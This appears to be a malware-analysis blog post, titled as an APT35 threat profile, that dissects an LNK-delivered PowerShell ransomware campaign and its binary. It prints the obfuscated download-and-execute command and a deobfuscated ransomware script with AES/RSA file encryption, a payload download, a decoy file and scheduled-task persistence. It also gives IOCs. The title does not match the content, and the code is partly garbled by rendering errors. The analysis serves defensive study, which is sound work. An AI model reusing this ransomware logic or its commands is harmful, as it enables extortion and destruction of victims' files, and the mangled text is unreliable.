---
layout: post
title: "Threat Profile: APT35 (Charming Kitten)"
description: "In-depth threat profile of APT35 — Iran’s state-sponsored cyber-espionage group."
date: 2025-10-17
categories: [Threat Intelligence, State-Sponsored Threats]
classes: wide
header:
  teaser: /assets/images/apt35-teaser.png
ribbon: Red
toc: true
---
 
  




Windows Shortcut files — commonly known as **LNK files** — are a core part of the Windows ecosystem. They allow users to create convenient links to files, folders, or applications without duplicating the original. You’ve probably used them on your desktop to quickly launch software or access frequently used directories.

### LNK File Structure (Simplified)

A typical LNK file contains:

- **Header**: Contains metadata (e.g., file size, attributes, timestamps).
- **Link Target ID List**: Points to the actual file location.
- **LinkInfo**: Holds information about the target volume and path.
- **String Data**: Stores display names, descriptions, etc.
- **Extra Data Blocks**: Can contain additional info like icon paths, arguments, or even custom commands.

---

![](https://cdn-images-1.medium.com/max/1000/0*_rbPm792hK7A-1Vb.png)

Source: Unit42

**Recently, I came across a case involving the malicious abuse of** `**.LNK**` **(Windows Shortcut) files used as a vector to deliver ransomware.**

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/07/image-12-1024x332.png)

**Infection Chain**

This sparked my interest, as **LNK-based** attacks are becoming increasingly common in modern threat campaigns.

![](https://cdn-images-1.medium.com/max/1000/1*S9v-FGuP6IvaooJooZoSgg.png)

So let’s explore this obfuscated PowerShell Script to see what this script is doing

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -c “R=′)′′tob/niam/sdaeh/sfer/a/zdqrl/moc.tnetnocresubuhtig.war//:sptth′′(gnirtSdaolnwoD.)tneilCbeW.teN.metsyStcejbO−weN(XEI′;IEX(R=′)′′tob/niam/sdaeh/sfer/a/zdqrl/moc.tnetnocresubuhtig.war//:sptth′′(gnirtSdaolnwoD.)tneilCbeW.teN.metsyStcejbO−weN(XEI′;IEX(R[-1…-($R.Length)] -Join ‘’)”

### How the Obfuscation Works

- The command defines a variable `$R` containing a reversed string.
- It then uses `($R[-1..-($R.Length)] -Join '')` to reverse the string back to its original order.
- Finally, it executes the resulting string using `IEX` (Invoke-Expression).

### Deobfuscated String

The obfuscated string inside `$R` is:

)’‘tob/niam/sdaeh/sfer/a/zdqrl/moc.tnetnocresubuhtig.war//:sptth’’

After cleaning (removing extra quotes and parentheses) and reversing, the actual deobfuscated string is:

hxxps[:][//raw.githubusercontent.com/lrqdz/a/refs/heads/main/bot](https://raw.githubusercontent.com/lrqdz/a/refs/heads/main/bot)

This is a common technique used in malicious scripts to fetch and execute arbitrary code from a remote server, bypassing local security restrictions by using the `-ep Bypass` (ExecutionPolicy Bypass) parameter.

---

The previously observed obfuscated PowerShell command was used to download an additional PowerShell script, which ultimately facilitated the deployment of the ransomware payload.

![](https://cdn-images-1.medium.com/max/1000/1*MTIhF7OlG98SBBrAlCLQ-w.png)

Let’s break down and deobfuscate the provided PowerShell script, explaining what each part does and its implications.

### 1. Overview

This script is a ransomware-like payload. It:

- Encrypts files in key user directories (Desktop, Downloads, Documents, etc.).
- Leaves a ransom note (in the form of a seemingly benign meeting minutes file).
- Installs persistence by scheduling itself to run again in one minute.
- Downloads a secondary payload (likely a decryption tool or further malware).

### 2. Step-by-Step Deobfuscation

#### A. Function `b` (Encryption Routine)

#### Variable Setup:
---

vRTfFXbX99=vRTfFXbX99=env:USERNAME  
KaTeX parse error: Undefined control sequence: \Users at position 15: slFWoOrP99='C:\̲U̲s̲e̲r̲s̲\'+vRTfFXbX99  
$AkGaihQv99=@(’\Desktop’,’\Downloads’,’\Documents’,’\Pictures’,’\Videos’,’\Music’,’\OneDrive’)

- Gets the current Windows username.
- Constructs the path to the user’s profile folder.
- Defines a list of subfolders to target (Desktop, Downloads, etc.).

---

### Key Generation

$kEY=New-Object byte[] 16  
$zyBYjPSi99=[System.Security.Cryptography.RNGCryptoServiceProvider]::new()  
zyBYjPSi99.GetBytes(zyBYjPSi99.GetBytes(kEY)

- Generates a 16-byte random AES key (used for file encryption).

---

### Public Key for Key Encryption

$Key_m=[byte[]]@(0xdd,0x39,0x18,0xff,0x64,0xd4,0xfb,0xc6,…) # truncated for brevity  
$kEY_E=[byte[]]@(0x01,0x00,0x01)  
$wVWNiGgX99=New-Object System.Security.Cryptography.RSAParameters  
wVWNiGgX99.Modulus=wVWNiGgX99.Modulus=Key_m  
wVWNiGgX99.Exponent=wVWNiGgX99.Exponent=kEY_E  
$rsa=[System.Security.Cryptography.RSA]::Create()  
rsa.ImportParameters(rsa.ImportParameters(wVWNiGgX99)

- Defines an RSA public key (modulus and exponent) in raw bytes.
- Creates an RSA object and imports the public key.
- This public key is used to encrypt the AES key, making it impossible to decrypt files without the corresponding private key.

---

### Encrypt the AES Key with RSA

VhBppDOc99=VhBppDOc99=rsa.Encrypt($kEY, [System.Security.Cryptography.RSAEncryptionPadding]::Pkcs1)

- The randomly generated AES key is encrypted with the attacker’s RSA public key.
- Without the private key, the victim cannot recover the AES key and thus cannot decrypt their files.

---

### Timestamp

$CYwQwYHI99=[System.BitConverter]::GetBytes([System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds())

- Gets the current Unix timestamp (seconds since 1970) as bytes.
- Likely used for tracking or as part of the encryption header.

---

### File Extensions to Skip

$PyCaWbSp99=@(’.exe’,’.lnk’,’.dll’,’.bin’,’.bat’,’.cmd’,’.sys’,’.inf’,’.vxd’,’.ini’,’.cfg’,’.reg’,’.hiv’,’.ENCRYPT’)

- Files with these extensions are not encrypted (to avoid breaking the system).

---

### File Encryption Loop

foreach($CiWVvyXw99 in $AkGaihQv99) {  
jGlkzoDW99=jGlkzoDW99=slFWoOrP99+$CiWVvyXw99  
if (Test-Path -LiteralPath $jGlkzoDW99) {  
$zaZUmabr99=Get-ChildItem -Path jGlkzoDW99−File−Recurseforeach(jGlkzoDW99−File−Recurseforeach(YWZsVfTx99 in $zaZUmabr99) {  
HVEvLQGG99=HVEvLQGG99=YWZsVfTx99.Extension.ToLower()  
if ($PyCaWbSp99 -contains $HVEvLQGG99){continue}  
try{  
KDJdjrbK99=[System.IO.File]::ReadAllBytes(KDJdjrbK99=[System.IO.File]::ReadAllBytes(YWZsVfTx99.FullName)  
$FcOlqhnq99=[System.Security.Cryptography.Aes]::Create()  
FcOlqhnq99.Key=FcOlqhnq99.Key=kEY  
$FcOlqhnq99.GenerateIV()  
$FcOlqhnq99.Mode=[System.Security.Cryptography.CipherMode]::CBC  
$FcOlqhnq99.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7  
xvrxmTkJ99=xvrxmTkJ99=FcOlqhnq99.CreateEncryptor()  
oDCsHWcT99=oDCsHWcT99=xvrxmTkJ99.TransformFinalBlock($KDJdjrbK99, 0, KDJdjrbK99.Length)[System.IO.File]::WriteAllBytes(KDJdjrbK99.Length)[System.IO.File]::WriteAllBytes(YWZsVfTx99.FullName, CYwQwYHI99+CYwQwYHI99+VhBppDOc99+FcOlqhnq99.IV+FcOlqhnq99.IV+oDCsHWcT99)  
dWCcDFLY99=dWCcDFLY99=YWZsVfTx99.Name+’.ENCRYPT’  
Rename-Item -Path $YWZsVfTx99.FullName -NewName KaTeX parse error: Expected 'EOF', got '}' at position 33: … }̲finally {if (FcOlqhnq99) { $FcOlqhnq99.Dispose(); }}  
}  
}  
}

- Iterates through each target directory.
- Recursively finds all files (except those with skipped extensions).
- Encrypts each file using AES-256-CBC (random IV each time).
- Prepends the encrypted file with:  
    `[timestamp][RSA-encrypted AES key][AES IV][encrypted file content]`
- Renames the file to `[original name].ENCRYPT`.

---

### Download Decryptor

sbAakPDI99=sbAakPDI99=slFWoOrP99+’\Desktop\Decryptor.exe’  
Invoke-WebRequest -o $sbAakPDI99 [https://github.com/lrqdz/a/releases/download/dat/A](https://github.com/lrqdz/a/releases/download/dat/A)

- Downloads a file named `Decryptor.exe` to the user’s Desktop from a GitHub repository.
- This is likely a ransom note or a fake decryptor (real decryptors would require the attacker’s private key).

---

### Ransom Note / Decoy File

KaTeX parse error: Undefined control sequence: \Users at position 6: f='C:\̲U̲s̲e̲r̲s̲\'+env:USERNAME+’\Downloads\Project_Workshop_7th_Minutes.txt’  
“MEETING MINUTES`r`nProject/Committee: Quarterly Research Progress Review`r`nTime: 10:00 AM - 11:30 AM`r`nLocation: Conference Room 301, Innovation Center`r`nChairperson: Dr. Alexandra Chen`r`nSecretary: Janna Riley`r`n`r`nATTENDEES`r`nChair, RDC Department: Dr. Alexandra Chen`r`nExternal Advisor: Prof. Benjamin Lee`r`nLead Researcher: Dr. Sophia Martinez`r`nData Analyst: Mr. James Wilson`r`nProject Coordinator: Ms. Emily Zhao`r`nAbsent with Notice: Dr. Robert Kim`r`n`r`nAGENDA ITEMS`r`n1. Review of Q2 Research Milestones`r`nDiscussion: Dr. Martinez presented progress on Phase 3 clinical trials, highlighting 85% participant enrollment completion. Prof. Lee raised concerns about data variance in Group B.`r`nDecision: Approval to allocate additional 15,000 budget for statistical consultation.`r`nAction Items:`r`n(1) Dr. Martinez to submit revised analysis report.`r`n(2) Mr. Wilson to audit Group B data anomalies.`r`n`r`n2. Publication Strategy for Findings`r`nDiscussion: Debate on prioritizing high-impact journals vs. open-access platforms. Ms. Zhao noted funding mandates requiring open-access compliance.`r`nDecision: Dual-track submission to The Lancet and institutional repository.`r`nAction Items:`r`n(1) Prof. Lee to contact Lancet editorial board.`r`n(2) Ms. Zhao to prepare preprint deposit.`r`n`r`n3. Ethics Compliance Update`r`nDiscussion: IRB flagged consent form discrepancies in Site 5 documentation.`r`nDecision: Immediate suspension of Site 5 recruitment pending audit.`r`nAction Items:`r`n(1) Dr. Chen to lead compliance review team.”| Set-Content -Path $f -Encoding UTF8 -Force  
Invoke-Item $f

- Creates a file `**Project_Workshop_7th_Minutes.txt**` in Downloads.
- Fills it with plausible meeting minutes (a decoy to avoid immediate suspicion).
- Opens the file to show it to the user.

![](https://cdn-images-1.medium.com/max/1000/1*7sauUEaOZH-Zn66kjI73GQ.png)

---

### Persistence Mechanism

IFURJAhb99=IFURJAhb99={function:b}.ToString()  
$cndmqHSH99=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)  
LXqaoRoa99=New−ScheduledTaskAction−Execute"powershell.exe"−Argument"−NoProfile−WindowStyleHidden−ExecutionPolicyBypass−c‘"LXqaoRoa99=New−ScheduledTaskAction−Execute"powershell.exe"−Argument"−NoProfile−WindowStyleHidden−ExecutionPolicyBypass−c‘"IFURJAhb99`""  
Register-ScheduledTask -TaskName “RunDoBgTask” -Trigger $cndmqHSH99 -Action $LXqaoRoa99 -Force

- Schedules the script to run again in 1 minute using Windows Task Scheduler.
- Task name: `RunDoBgTask`
- Ensures the malware persists even if the initial execution is interrupted.

---

![](https://cdn-images-1.medium.com/max/1000/1*6jyi1zsrIGZYaUjfpJw00w.png)

![](https://cdn-images-1.medium.com/max/1000/0*P9RcfQWE_K-4FQxf.jpeg)

![](https://cdn-images-1.medium.com/max/1000/0*w_ZUv77YhyoDmLE8.png)

**Notably, the ransom note does not mention the name of any known ransomware group or operator.** Instead, it instructs victims to send a payment of **$500 in Monero (XMR)** to the following wallet address:

```
84grfxkXuNSMzg2FRjPB6KBMbWPwHibGrGYTn9tCn8a7b2oSLzipZxP8oNph5Me7aqEYU2fAEfmByEjdGojgdNKyLRc7otM
```

The note claims that upon payment, victims will receive a decryption key and a file that can restore access to their encrypted data.

---

Encryption Algorithm

## Methodology Encryption Ransomware

Methodology encryption algorithms such as AES can be used to encrypt the files with large speed rate. On this approach the ransomware will only use this encryption mechanism. It’ll encrypt all the user files with the AES algorithm and store on disk the keys used to encrypt each file. So when the infected pays the ransomware, Decryptor will open this file with the keys and start decrypting the files.

## Encryption Part

In **sub_401876** -> AES_EncryptBlock this the main for AES Encryption ECB. The AES encryption process begins by loading the 16-byte plaintext block into a temporary internal structure called the **state**. This state is a `4×4` byte matrix (also referred to as a 128-bit block), and it is populated in column-major.

That means:

- The first four bytes of the input fill the first column, The next four bytes fill the second column, And so on until all 16 bytes are loaded.

![](https://miro.medium.com/v2/resize:fit:875/1*r0TNSkE-E609DzVJYM5Gbg.png)

After the initial Add__RoundKey (Round 0), AES proceeds with multiple transformation rounds, followed by a final round and writing the encrypted output.

## Main AES Rounds (Round 1 to Nr — 1)

AES performs multiple rounds depending on the key size -> 10 rounds for AES-128.

## Each Round Consists of:

**Add__SubBytes**

- Each byte in the state is substituted with its corresponding value from the sbox. To be non-linearity and confusion.

![](https://miro.medium.com/v2/resize:fit:661/1*tktM-diOwE0W_LA4jtGm6Q.png)

**Add__ShiftRows**

**Add__MixColumns**

- Each row of the state matrix is shifted to the left by a fixed offset:
    
- Row 0: No shift
    
- Row 1: 1-byte shift
    
- Row 2: 2-byte shift
    
- Row 3: 3-byte shift
    
- Increases diffusion by mixing columns.
    
- Each column is transformed using finite field multiplication.
    
- Enhances diffusion further by combining bytes across the column.
    

**Add__RoundKey**

- A round-specific **128-bit** key is **XORed** with the state.

![](https://miro.medium.com/v2/resize:fit:785/1*C9SoeP1ttOWA2uk8WX_cIg.png)

## Final Round (Without MixColumns)

- After completing **`Nr - 1`** rounds, the final round is performed.
- **Key Difference:** The `**MixColumns**` step is omitted to maintain the correct inverse transformation during decryption.

## Write Output Block

After the final round, the state matrix is written back to the output buffer in the same **column-major**.

![](https://miro.medium.com/v2/resize:fit:796/1*d-EczfvEDL8rrP_S_gUwHA.png)

```
AES_EncryptBlock — Summary Diagram
├── Load input (16 bytes) into state
├── Add__RoundKey (round 0 key)
├── For round = 1 up to Nr — 1:
│ ├── Add__SubBytes
│ ├── Add__ShiftRows
│ ├── Add__MixColumns
│ └── Add__RoundKey
├── Add__SubBytes
├── Add__ShiftRows
├── Add__RoundKey(final round key, round Nr)
└── Write output (16 bytes)
```

## Decryption Part

In **sub_401C9C** -> **AES_DecryptBlock** this the main for **AES** Decryption **ECB**. In this initial step, the function loads the **16-byte ciphertext block** into a temporary internal **4×4 AES state matrix**. **AES** organizes this matrix in **column-major order**, meaning that the input bytes are placed column by column.

![](https://miro.medium.com/v2/resize:fit:875/1*-T1-rv1CDYWlP7gMjYA5bQ.png)

The loop runs for 4 iterations (corresponding to 4 columns), and in each iteration.

- Reads 4 bytes spaced by 4 (stride of **4 ×** index).
- Writes them contiguously into the `**stateCursor**` buffer.

## Initial Round Key Addition (Round Nr-1)

**Add__RoundKey**

AES decryption starts with the **last round key,** which was used in the final round of encryption.`*(**ctx + 4**)` holds the number of rounds `Nr-1`.

- State = **Ciphertext XOR RoundKey[Nr-1]**

## Main Decryption Rounds (Rounds Nr — 1 down to 1)

**These steps reverse the exact transformations done in AES encryption rounds.**

**Inv__SubBytes**

- Applies the inverse **inv_sbox** to each byte to undo non-linear substitution.

![](https://miro.medium.com/v2/resize:fit:658/1*7uwhk28KlqGiXvr7cIwFvw.png)

**Inv__ShiftRows**

- Shifts rows in the opposite direction of encryption (to the right).

**Add__RoundKey**

- XORs with the correct round key for that round. _**roundKeyOffset = (16 * j);**_

**Inv__MixColumns**

- Applies the inverse matrix multiplication to undo column mixing.

![](https://miro.medium.com/v2/resize:fit:871/1*pmRX67TQx3l2HGPtKynotA.png)

## Final Round (Without Inverse MixColumns)

- **Like encryption, the final decryption round omits the MixColumns step.**
- The initial key (`**roundKeys[0]**`) is XORed here, reversing the very first encryption transformation.

## Write the Decrypted State to Output Buffer

- Writes the 16-byte decrypted state (`**v15**`) into the output buffer in column-major order. This reassembles the final 16-byte plaintext block.

![](https://miro.medium.com/v2/resize:fit:875/1*XbfB6LrJTY9mzI0wXTOHzg.png)

```
AES_DecryptBlock — Summary Diagram
├── Load input (16 bytes) into state
├── Add__RoundKey (final round key, round Nr)
├── For round = Nr — 1 down to 1:
│ ├── Inv__SubBytes
│ ├── Inv__ShiftRows
│ ├── Add__RoundKey
│ └── Inv__MixColumns
├── Inv__SubBytes
├── Inv__ShiftRows
├── Add__RoundKey (initial round key, round 0)
└── Write output (16 bytes)
```

## Anti-Debugging Logic

**Part One**

This section of the function `**sub_411B80**` is responsible for collecting system-specific and time-sensitive data to prepare for the generation of a unique runtime value. This value will later be used as a seed for cryptographic operations or behavioral logic and is also designed to help detect debugging or analysis environments.

![](https://miro.medium.com/v2/resize:fit:875/1*4h-ZWY9gmrbq4IpV7W5oUg.png)

**Part two**

After collecting entropy from the system (as described in Part 1), the function proceeds to generate a **48-bit** runtime-specific value using a bitwise XOR operation on all gathered values. The final result is masked to 48 bits.

![](https://miro.medium.com/v2/resize:fit:875/1*hJjoAd8Vh1OyuMTmiyaehA.png)

If the result matches the sentinel value **0x2B992DDFA232LL** (highly unlikely in a real system due to random inputs), it may indicate a **debugger** or **sandbox** manipulating the environment.

![](https://miro.medium.com/v2/resize:fit:465/1*-8bl3Hn3DwBc9ZAtkvFg1w.png)

The global variables globalSeed and seedComplement track state, ensuring the check runs once or stores the result for later use (to alter ransomware behavior).

![](https://miro.medium.com/v2/resize:fit:844/1*GVtjsbH93UNDM8qYldTrdA.png)

## Data Collection

Part One

The analyzed code implements a ransomware routine that **targets and encrypts user files** located in common personal directories. It dynamically constructs file paths and processes files in memory before encrypting them.

![](https://miro.medium.com/v2/resize:fit:875/1*9Y5YZEWMrdQ-264IiPXhrQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*lNgT7ibKAz5gvo-tqymvsw.png)

![](https://miro.medium.com/v2/resize:fit:746/1*Oun1q1A6ysxsDclW0D79fw.png)

![](https://miro.medium.com/v2/resize:fit:875/1*j92Zygp3UjRKbv7YlkiW4A.png)

Part Two

In **sub_40720E** renamed -> **CollectDirectoryFiles** take argument **rootPathIndex** that data collecting from “Part One”. **CollectDirectoryFiles** is a recursive function that enumerates all files and directories starting from a given root path. It processes each file and subdirectory.

1. **Directory Traversal**:

- The code walks through the filesystem using the **`FindFirstFileW` / `FindNextFileW`**`.` It reads entries like files and subdirectories under the current directory.

![](https://miro.medium.com/v2/resize:fit:771/1*aWNj62FS3aWL4RY0FiFfcw.png)

2. **Recursive Call** (for subdirectories):

- When the function encounters a directory (folder) not a regular file — it function calls itself again but this time with the path of that subdirectory.

![](https://miro.medium.com/v2/resize:fit:788/1*TO0Pk-EvpGeI8TkTUk1qTQ.png)

3. **File Filtering**

- Filters out files with specific file name contains dot `"."` as an extension marker.

4. **Valid File Handling**

- After validating a file, it calling **PushPathToBuffer_0** to pushes the file path to a destination buffer (`**a2**`) and passes it to **`func_5`to** performs **file encryption.**

![](https://miro.medium.com/v2/resize:fit:875/1*T8YKJiIh48XgsQdzsSYSYQ.png)

## Communication

## Send_mail

The ransomware leverages low-level **Windows Sockets API calls** to establish a direct **TCP connection** with an **SMTP** server. It manually constructs the destination address and resolves the domain name to an IP address using legacy APIs. This approach to avoid higher-level API monitoring and reduce the chances of detection by endpoint security solutions.

![](https://miro.medium.com/v2/resize:fit:875/1*Lg1ul5UUy_6mtJsLteYtEg.png)

**IOCs**

- hxxps://github[.]com/lrqdz/a/releases/download/dat/A
- hxxps://raw[.]githubusercontent[.]com/lrqdz/a/refs/heads/main/bot
- 8f5671baa36e543527ad9f4b6275c8231c680e09ddf1f8b4854d6a4a92212b92
- ffadee13d0544cc44e2e0fad37f865d8f27441928deccc7941c1c20eae49c81d
- 933718846685c90cf5279f1af5928f4ff26638f609cbef8086b9869a73ea1d82
- a5be8bd84a034c04f21284f90882f370e58d7b17610192ef4436e88967e632b6
- 4ff8f63c1b6b562391ff4068a23d27fe5bdd2141b8e97568aa9e877b504fe4c5
